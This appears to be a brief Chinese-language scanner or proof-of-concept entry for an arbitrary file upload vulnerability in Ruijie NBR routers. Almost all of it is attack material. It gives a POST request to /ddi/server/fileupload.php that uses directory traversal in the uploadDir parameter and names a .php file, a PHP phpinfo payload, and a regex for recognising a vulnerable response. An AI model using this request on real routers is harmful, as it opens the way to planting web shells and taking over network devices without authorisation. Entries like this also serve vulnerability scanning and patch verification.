# 锐捷NBR路由器任意文件上传漏洞

锐捷 ｜ 文件上传 ｜ —
- **请求**：`POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1`

**Payload**
```
<?php phpinfo();?>
```
- **响应特征**：200 ^(?=.*?jsonrpc)(?=.*?php).*?$